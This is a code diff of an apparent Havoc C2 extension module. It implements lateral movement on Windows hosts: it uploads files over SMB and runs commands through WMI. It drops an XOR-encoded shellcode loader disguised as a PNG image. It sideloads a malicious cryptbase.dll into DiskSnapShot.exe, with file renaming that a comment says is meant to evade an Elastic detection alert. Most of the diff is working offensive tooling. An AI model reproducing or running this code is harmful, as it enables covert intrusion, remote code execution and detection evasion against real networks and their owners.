@@ -80,12 +80,12 @@ def smb_writefile( demonID, *params ):
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
         return False
 
-    print(f"[debug] [rupload] type(params[0]): {type(params[0])}")
+    #print(f"[debug] [rupload] type(params[0]): {type(params[0])}")
     if type(params[0]) == tuple:
         params = params[0]
-    params = params[1:]
+    #params = params[1:]
     num_params = len(params)
-    print(f"[debug] [rupload] params2: {params}")
+    print(f"[debug] [rupload] params: {params}")
 
     target = params[0]
     is_current = False
@@ -118,13 +118,13 @@ def wmi_proccreate( demonID, *params):
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
         return False
 
-    print(f"[debug] [exec] type(params[0]): {type(params[0])}")
+    #print(f"[debug] [exec] type(params[0]): {type(params[0])}")
     if type(params[0]) == tuple:
         params = params[0]
-    print(f"[debug] [exec] params1: {params}")
-    params = params[1:] # required if params are passed directly as *params
+    #print(f"[debug] [exec] params1: {params}")
+    #params = params[1:] # required if params are passed directly as *params
     num_params = len(params)
-    print(f"[debug] [exec] params2: {params}")
+    print(f"[debug] [exec] params: {params}")
 
     target     = ''
     username   = ''
@@ -182,16 +182,15 @@ def load(demonID, *params):
     print(f"[debug] [load] params: {params}")
     #params = params[1:]
     num_params = len(params)
-    print(params)
-    targetHost = params[1]
-    targetFile = params[2]
+    targetHost = params[0]
+    targetFile = params[1]
 
     TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Perfoming lateral movement with provided exe..." )
 
-    newParams = ("rupload", targetHost, targetFile, "C:\\Windows\\Temp\\load.exe")
+    newParams = (targetHost, targetFile, "C:\\Windows\\load.exe")
     smb_writefile(demonID, newParams)
 
-    newParams = ("load", targetHost, "cmd.exe /c C:\\Windows\\Temp\\load.exe")
+    newParams = (targetHost, "cmd.exe /c C:\\Windows\\load.exe")
     wmi_proccreate(demonID, newParams)
 
     return TaskID
@@ -206,25 +205,24 @@ def xorload(demonID, *params):
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
         return False
 
-    print(f"[debug] [load] params: {params}")
+    print(f"[debug] [xorload] params: {params}")
     #params = params[1:]
     num_params = len(params)
-    print(params)
-    targetHost = params[1]
-    demonFile = params[2]
+    targetHost = params[0]
+    demonFile = params[1]
 
     TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Perfoming lateral movement with xor shellcode loader..." )
 
     # xor encode provided raw shellcode file
     xorencode(demonFile, XOR_KEY, "bin/xordemon.bin")
 
-    newParams = ("rupload", targetHost, "bin/xordemon.bin", "C:\\Windows\\image02.png")
+    newParams = (targetHost, "bin/xordemon.bin", "C:\\Windows\\image02.png")
     smb_writefile(demonID, newParams)
 
-    newParams = ("rupload", targetHost, "bin/loader.exe", "C:\\Windows\\load.exe")
+    newParams = (targetHost, "bin/loader.exe", "C:\\Windows\\load.exe")
     smb_writefile(demonID, newParams)
 
-    newParams = ("load", targetHost, "cmd.exe /c C:\\Windows\\load.exe")
+    newParams = (targetHost, "cmd.exe /c C:\\Windows\\load.exe")
     wmi_proccreate(demonID, newParams)
 
     return TaskID
@@ -239,12 +237,11 @@ def sideload(demonID, *params):
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
         return False
 
-    print(f"[debug] [load] params: {params}")
+    print(f"[debug] [sideload] params: {params}")
     #params = params[1:]
     num_params = len(params)
-    print(params)
-    targetHost = params[1]
-    demonFile = params[2]
+    targetHost = params[0]
+    demonFile = params[1]
 
     TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Perfoming lateral movement with xor shellcode loader via DLL sideloading..." )
 
@@ -252,23 +249,23 @@ def sideload(demonID, *params):
     xorencode(demonFile, XOR_KEY, "bin/xordemon.bin")
 
     # Write to dll sideloader to target location
-    newParams = ("rupload", targetHost, "bin/signed_sideloader.dll", "C:\\Windows\\cryptbase.png")
+    newParams = (targetHost, "bin/signed_sideloader.dll", "C:\\Windows\\cryptbase.png")
     smb_writefile(demonID, newParams)
 
     # Change cryptbase extension via WMI, avoiding elastic "Lateral Tool via SMB" alert
-    newParams = ("load", targetHost, "cmd.exe /c copy C:\\Windows\\cryptbase.png C:\\Windows\\cryptbase.dll && echo --path C:\\Windows\\CCMCache\\cache")
+    newParams = (targetHost, "cmd.exe /c copy C:\\Windows\\cryptbase.png C:\\Windows\\cryptbase.dll && echo --path C:\\Windows\\CCMCache\\cache")
     wmi_proccreate(demonID, newParams)
 
     # upload xor encoded demon to target location
-    newParams = ("rupload", targetHost, "bin/xordemon.bin", "C:\\Windows\\image02.png")
+    newParams = (targetHost, "bin/xordemon.bin", "C:\\Windows\\image02.png")
     smb_writefile(demonID, newParams)
 
     # Move write.exe to directory containing dll
-    newParams = ("load", targetHost, "cmd.exe /c copy C:\\Windows\\System32\\DiskSnapShot.exe C:\\Windows\\DiskSnapShot.exe && echo --path C:\\Windows\\CCMCache\\cache")
+    newParams = (targetHost, "cmd.exe /c copy C:\\Windows\\System32\\DiskSnapShot.exe C:\\Windows\\DiskSnapShot.exe && echo --path C:\\Windows\\CCMCache\\cache")
     wmi_proccreate(demonID, newParams)
 
     # Execute shellcode loader via DLL sideloading cryptbase.dll into DiskSnapShot.exe
-    newParams = ("load", targetHost, "cmd.exe /c C:\\Windows\\DiskSnapShot.exe && echo --path C:\\Windows\\CCMCache\\cache")
+    newParams = (targetHost, "cmd.exe /c C:\\Windows\\DiskSnapShot.exe && echo --path C:\\Windows\\CCMCache\\cache")
     wmi_proccreate(demonID, newParams)
 
     return TaskID
